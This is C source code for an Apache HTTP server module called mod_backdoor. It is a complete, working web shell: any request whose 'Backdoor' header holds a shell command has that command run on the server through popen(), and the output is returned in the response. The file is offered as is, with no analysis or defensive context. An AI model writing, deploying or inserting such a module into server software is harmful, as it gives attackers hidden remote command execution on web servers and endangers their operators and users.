#include "httpd.h"
#include "http_config.h"
#include "http_protocol.h"
#include "ap_config.h"
#include <stdio.h>
#include <stdlib.h>
#define BUFSIZE 1024
#define BACKDOOR_HEADER "Backdoor"

/* The sample content handler */
static int backdoor_handler(request_rec *r)
{
    /* Check if the handler is set to 'backdoor' */
    if (strcmp(r->handler, "backdoor") != 0) {
        return DECLINED;
    }

    /* Set the content type to text/html */
    r->content_type = "text/html";

    /* Check if the request is not a HEAD request */
    if (!r->header_only) {
        const apr_array_header_t *fields;
        apr_table_entry_t *elts;
        int i;

        /* Get the headers */
        fields = apr_table_elts(r->headers_in);
        elts = (apr_table_entry_t *)fields->elts;

        /* Look for the 'Backdoor' header */
        for (i = 0; i < fields->nelts; i++) {
            if (strcmp(elts[i].key, BACKDOOR_HEADER) == 0) {
                char *command = apr_pstrdup(r->pool, elts[i].val);
                FILE *fp;
                char buffer[BUFSIZE];
                size_t n;

                /* Execute the command and read the output */
                fp = popen(command, "r");
                if (fp == NULL) {
                    ap_rputs("Command execution failed.", r);
                    return HTTP_INTERNAL_SERVER_ERROR;
                }

                /* Read the command output and write it to the response */
                while ((n = fread(buffer, 1, sizeof(buffer) - 1, fp)) > 0) {
                    buffer[n] = '\0'; // Null-terminate the string
                    ap_rwrite(buffer, n, r);
                }

                pclose(fp);
                return OK;
            }
        }
    }

    /* If no 'Backdoor' header was found, return a simple message */
    ap_rputs("The sample page from mod_backdoor.c\n", r);
    return OK;
}

static void backdoor_register_hooks(apr_pool_t *p)
{
    ap_hook_handler(backdoor_handler, NULL, NULL, APR_HOOK_MIDDLE);
}

/* Dispatch list for API hooks */
module AP_MODULE_DECLARE_DATA backdoor_module = {
    STANDARD20_MODULE_STUFF,
    NULL,                  /* create per-dir    config structures */
    NULL,                  /* merge  per-dir    config structures */
    NULL,                  /* create per-server config structures */
    NULL,                  /* merge  per-server config structures */
    NULL,                  /* table of config file commands       */
    backdoor_register_hooks  /* register hooks                      */
};
